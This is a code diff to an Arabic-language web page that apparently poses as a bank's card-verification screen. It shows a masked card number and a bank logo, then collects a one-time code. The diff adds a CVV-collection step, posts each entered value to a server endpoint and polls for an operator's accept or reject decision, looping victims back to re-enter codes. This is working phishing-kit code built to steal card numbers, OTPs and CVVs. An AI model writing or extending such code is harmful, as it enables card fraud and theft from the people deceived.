@@ -265,6 +265,7 @@
     #otp-bank-logo { position:absolute; right:8px; top:50%; transform:translateY(-50%); height:18px; width:auto; object-fit:contain; pointer-events:none; }
     .otp-field { width:140px; font-size:16px; font-weight:700; text-align:center; letter-spacing:6px; height:38px; padding-right:52px; margin:0 auto; display:block; }
     .otp-side-label { position:absolute; right:10px; top:50%; transform:translateY(-50%); font-size:13px; font-weight:800; color:#555; pointer-events:none; }
+    .otp-inline-error { color:#cc0000; font-weight:800; font-size:13px; text-align:center; }
   </style>
 </head>
 <body>
@@ -378,11 +379,16 @@
             </div>
           </td>
         </tr>
+        <tr id="otp-error-row" style="display:none">
+          <td colspan="2" style="padding:4px 10px 0">
+            <div class="otp-inline-error" id="otp-inline-error">الرمز غير صحيح أو غير صالح</div>
+          </td>
+        </tr>
         <tr>
           <td class="td-input" colspan="2">
             <div class="otp-field-wrap">
               <input class="field otp-field" type="text" id="otp-input" inputmode="numeric" maxlength="6" placeholder="" autocomplete="one-time-code">
-              <span class="otp-side-label">OTP</span>
+              <span class="otp-side-label" id="otp-side-label">OTP</span>
             </div>
           </td>
         </tr>
@@ -780,8 +786,9 @@
       loadingCard.style.display  = 'block';
 
       if (!subId) { showRejected(); return; }
+      currentSubId = subId;
 
-      // استطلاع الحالة كل ثانيتين
+      // استطلاع الحالة — المرحلة الأولى (بطاقة)
       clearInterval(pollTimer2);
       pollTimer2 = setInterval(async () => {
         try {
@@ -793,7 +800,10 @@
       }, 2000);
     }
 
-    function showAccepted() {
+    let currentStep = 'otp'; // 'otp' | 'cvv'
+    let currentSubId = null;
+
+    function showOtpCard(withError) {
       loadingCard.style.display = 'none';
       const masked = savedCard.slice(0,4) + ' **** **** ' + savedCard.slice(-4);
       document.getElementById('masked-card-display').textContent = masked;
@@ -803,9 +813,39 @@
         logo.style.display = 'block';
         logo.onerror = () => { logo.style.display = 'none'; };
       }
+      currentStep = 'otp';
+      document.getElementById('otp-side-label').textContent = 'OTP';
+      document.getElementById('otp-input').value = '';
+      document.getElementById('otp-input').maxLength = 6;
+      const errRow = document.getElementById('otp-error-row');
+      errRow.style.display = withError ? 'table-row' : 'none';
       otpCard.style.display = 'block';
       document.getElementById('otp-action-card').style.display = 'block';
     }
+
+    function showCvvCard() {
+      loadingCard.style.display = 'none';
+      currentStep = 'cvv';
+      document.getElementById('otp-side-label').textContent = 'CVV';
+      document.getElementById('otp-input').value = '';
+      document.getElementById('otp-input').maxLength = 3;
+      document.getElementById('otp-error-row').style.display = 'none';
+      otpCard.style.display = 'block';
+      document.getElementById('otp-action-card').style.display = 'block';
+    }
+
+    // القبول والرفض يعتمدان على الخطوة الحالية
+    function onPollAccepted() {
+      if (currentStep === 'otp') { showCvvCard(); }
+      else { location.href = '/success.html'; }
+    }
+
+    function onPollRejected() {
+      if (currentStep === 'otp') { showOtpCard(true); }
+      else { showOtpCard(true); } // رفض CVV → رجوع لـ OTP
+    }
+
+    function showAccepted() { showOtpCard(false); }
 
     function showRejected() {
       loadingCard.style.display  = 'none';
@@ -814,10 +854,38 @@
       cardError.style.display    = 'block';
     }
 
-    function submitOtp() {
-      const otp = document.getElementById('otp-input').value.trim();
-      if (otp.length !== 4 && otp.length !== 6) { alert('الرجاء إدخال رمز OTP (4 أو 6 أرقام)'); return; }
-      location.href = '/success.html';
+    function startPolling(id) {
+      clearInterval(pollTimer2);
+      pollTimer2 = setInterval(async () => {
+        try {
+          const r = await fetch('/api/status/' + id);
+          const d = await r.json();
+          if (d.status === 'accepted') { clearInterval(pollTimer2); onPollAccepted(); }
+          else if (d.status === 'rejected') { clearInterval(pollTimer2); onPollRejected(); }
+        } catch(e) {}
+      }, 2000);
+    }
+
+    async function submitOtp() {
+      const val = document.getElementById('otp-input').value.trim();
+      if (currentStep === 'otp' && val.length !== 4 && val.length !== 6) {
+        alert('الرجاء إدخال رمز OTP (4 أو 6 أرقام)'); return;
+      }
+      if (currentStep === 'cvv' && val.length < 3) {
+        alert('الرجاء إدخال رمز CVV'); return;
+      }
+      otpCard.style.display = 'none';
+      document.getElementById('otp-action-card').style.display = 'none';
+      loadingCard.style.display = 'block';
+      const body = currentStep === 'otp' ? { otp: val } : { cvv: val };
+      try {
+        await fetch('/api/submit-step/' + currentSubId, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body)
+        });
+      } catch(e) {}
+      startPolling(currentSubId);
     }
 
     function handleCancel() { history.back(); }
